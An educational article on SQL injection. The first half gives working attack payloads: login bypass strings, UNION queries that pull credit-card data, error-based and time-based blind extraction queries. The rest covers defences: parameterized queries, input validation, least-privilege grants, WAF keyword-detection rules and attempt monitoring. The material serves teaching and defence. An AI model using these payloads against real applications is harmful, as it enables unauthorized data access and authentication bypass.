---
title: SQL Injection
draft: false
date: 2025-01-01
tags:
  - owasp
  - sql_injection
  - database_vulnerability
---

SQL Injection is a critical web application security vulnerability that occurs when user input is directly inserted into SQL queries without proper validation or sanitization. This attack allows malicious actors to manipulate database queries, potentially leading to unauthorized data access, data modification, authentication bypass, and complete database compromise.

**Attack Mechanism:**
SQL injection exploits occur when applications construct SQL queries by concatenating user input directly into query strings, rather than using parameterized queries or prepared statements.

**Basic Authentication Bypass Example:**

Vulnerable login query:

```sql
SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'USER_INPUT';
```

**Attack Vector 1: Comment-based bypass**

- **Username:** `admin'--`
- **Password:** `anything`

Resulting malicious query:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';
```

The `--` comment syntax effectively removes the password check, allowing authentication bypass if an 'admin' user exists.

**Attack Vector 2: Boolean-based bypass**

- **Username:** `admin' OR '1'='1'--`
- **Password:** `anything`

Resulting query:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything';
```

Since `'1'='1'` is always true, this bypasses both username and password validation.

**UNION-based SQL Injection:**

Attackers can extract data from other database tables using UNION SELECT statements to combine results from multiple queries.

Original vulnerable query:

```sql
SELECT name, email FROM users WHERE id = '$ID';
```

**Attack payload:**

```sql
1' UNION SELECT credit_card_number, security_code FROM creditcards--
```

**Resulting malicious query:**
```sql
SELECT name, email FROM users WHERE id = '1' UNION SELECT credit_card_number, security_code FROM creditcards--';
```

This attack allows extraction of sensitive financial data from unrelated tables. The attacker must:
1. **Determine column count** using ORDER BY or UNION SELECT NULL
2. **Identify data types** of each column
3. **Enumerate database schema** to find valuable tables
4. **Extract data** systematically

**Advanced UNION injection example:**

```sql
-- Step 1: Determine column count
1' ORDER BY 1-- (success)
1' ORDER BY 2-- (success)
1' ORDER BY 3-- (error = 2 columns)

-- Step 2: Extract database information
1' UNION SELECT database(), version()--
1' UNION SELECT table_name, column_name FROM information_schema.columns--
```

**Error-based SQL Injection:**

Database error messages can reveal valuable information about the database structure, enabling more sophisticated attacks.

**Triggering error disclosure:**

```http
GET /user.php?id=1' HTTP/1.1
Host: vulnerable-site.com
```

**Example error responses revealing system information:**

```sql
MySQL Error: You have an error in your SQL syntax near ''1'' at line 1
Table 'myapp.users' doesn't exist
Unknown column 'admin_password' in 'field list'
```

**Exploitation techniques:**

```sql
-- Extract database version
1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Extract table names
1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Extract column information
1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Time-based Blind SQL Injection:**
When error messages are suppressed, attackers use time delays to infer information:

```sql
-- MySQL time-based detection
1' AND (SELECT SLEEP(5))--

-- PostgreSQL time-based detection
1'; SELECT pg_sleep(5)--

-- SQL Server time-based detection
1'; WAITFOR DELAY '00:00:05'--
```

## Comprehensive Prevention Strategies

### 1. **Parameterized Queries and Prepared Statements**

**PHP PDO Example:**

```php
// Vulnerable code
$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
$result = mysqli_query($connection, $sql);

// Secure implementation
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$result = $stmt->fetchAll();
```

**Java PreparedStatement:**

```java
// Vulnerable code
String sql = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// Secure implementation
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(sql);
pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();
```

**Python SQLAlchemy:**

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE email = '{email}'"
result = session.execute(query)

# Secure implementation
from sqlalchemy import text
query = text("SELECT * FROM users WHERE email = :email")
result = session.execute(query, {"email": email})
```

### 2. **Input Validation and Sanitization**

```python
import re
from typing import Optional

def validate_input(user_input: str, input_type: str) -> Optional[str]:
    """Validate and sanitize user input based on expected type."""

    patterns = {
        'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
        'username': r'^[a-zA-Z0-9_]{3,20}$',
        'numeric_id': r'^\d+$',
        'alphanumeric': r'^[a-zA-Z0-9]+$'
    }

    if input_type not in patterns:
        return None

    if re.match(patterns[input_type], user_input):
        return user_input

    return None

# Usage example
user_id = validate_input(request.form['id'], 'numeric_id')
if user_id is None:
    return "Invalid input format", 400
```

### 3. **Database Security and Principle of Least Privilege**

```sql
-- Create restricted database user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant minimal necessary permissions
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'webapp'@'localhost';
GRANT SELECT ON myapp.products TO 'webapp'@'localhost';

-- Explicitly deny dangerous operations
REVOKE ALL PRIVILEGES ON mysql.* FROM 'webapp'@'localhost';
REVOKE FILE, PROCESS, SUPER ON *.* FROM 'webapp'@'localhost';

-- Remove ability to access system tables
REVOKE SELECT ON information_schema.* FROM 'webapp'@'localhost';
```

### 4. **Error Handling and Information Disclosure Prevention**

```php
// Production error handling
try {
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$user_id]);
    $user = $stmt->fetch();
} catch (PDOException $e) {
    // Log detailed error for developers
    error_log("Database error: " . $e->getMessage());

    // Return generic message to users
    http_response_code(500);
    echo json_encode(["error" => "An internal error occurred"]);
    exit;
}
```

### 5. **Advanced Protection Techniques**

**Stored Procedures:**

```sql
DELIMITER //
CREATE PROCEDURE GetUserById(IN userId INT)
BEGIN
    SELECT id, username, email FROM users WHERE id = userId;
END //
DELIMITER ;
```

**Web Application Firewall (WAF) Rules:**

```apache
# ModSecurity rules for SQL injection protection
SecRule ARGS "@detectSQLi" \
    "id:1001,phase:2,block,msg:'SQL Injection Attack Detected',\
     logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"

SecRule ARGS "@rx (?i:(union|select|insert|delete|update|drop|create|alter|exec|execute))" \
    "id:1002,phase:2,block,msg:'SQL Keywords Detected'"
```

**Real-time Monitoring:**

```python
import logging
from datetime import datetime, timedelta
from collections import defaultdict

class SQLInjectionMonitor:
    def __init__(self):
        self.failed_attempts = defaultdict(list)
        self.blocked_ips = set()

    def log_suspicious_activity(self, ip_address: str, payload: str):
        """Log and monitor for SQL injection attempts."""
        current_time = datetime.now()

        # Log the attempt
        logging.warning(f"Potential SQL injection from {ip_address}: {payload}")

        # Track attempts per IP
        self.failed_attempts[ip_address].append(current_time)

        # Remove old attempts (older than 1 hour)
        cutoff_time = current_time - timedelta(hours=1)
        self.failed_attempts[ip_address] = [
            attempt for attempt in self.failed_attempts[ip_address]
            if attempt > cutoff_time
        ]

        # Block IP if more than 5 attempts in 1 hour
        if len(self.failed_attempts[ip_address]) >= 5:
            self.blocked_ips.add(ip_address)
            logging.critical(f"IP {ip_address} blocked for repeated SQL injection attempts")
```
